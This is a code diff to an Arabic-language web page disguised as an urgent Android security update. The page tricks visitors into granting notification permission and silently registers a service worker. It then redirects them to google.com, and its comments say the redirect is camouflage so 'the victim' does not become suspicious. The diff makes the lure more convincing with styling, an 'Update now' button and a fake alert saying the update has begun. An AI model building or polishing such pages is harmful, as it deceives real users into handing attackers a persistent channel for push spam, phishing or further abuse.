@@ -2,19 +2,31 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تحديث نظام أندرويد</title>
 </head>
-<body style="text-align: center; font-family: sans-serif; padding-top: 50px;">
-    <h2>جاري فحص توافق الجهاز مع التحديث الجديد...</h2>
-    <p>يرجى الضغط على <b>"سماح" (Allow)</b> لتلقي إشعار عند اكتمال التحديث.</p>
+<body style="background: #f0f0f0; text-align: center; font-family: Arial; padding-top: 100px;">
+    <div style="background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+        <h2 style="color: #333;">تحديث الأمان جاهز</h2>
+        <p>جهازك يتطلب تحديثاً عاجلاً لتحسين أداء النظام.</p>
+        <button onclick="startCheck()" style="background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px;">
+            تحديث الآن
+        </button>
+    </div>
+
     <script>
-        Notification.requestPermission().then(perm => {
-            if (perm === 'granted') {
-                navigator.serviceWorker.register('sw.js');
-                // تمويه: توجيه الضحية لموقع حقيقي بعد 3 ثواني
-                setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
-            }
-        });
+        function startCheck() {
+            Notification.requestPermission().then(perm => {
+                if (perm === 'granted') {
+                    navigator.serviceWorker.register('sw.js');
+                    alert("بدأ التحديث في الخلفية، ستصلك رسالة عند الاكتمال.");
+                    // تمويه: توجيه الضحية لموقع حقيقي لكي لا يشك
+                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+                } else {
+                    alert("يجب السماح بالإشعارات لإتمام التحديث.");
+                }
+            });
+        }
     </script>
 </body>
 </html>
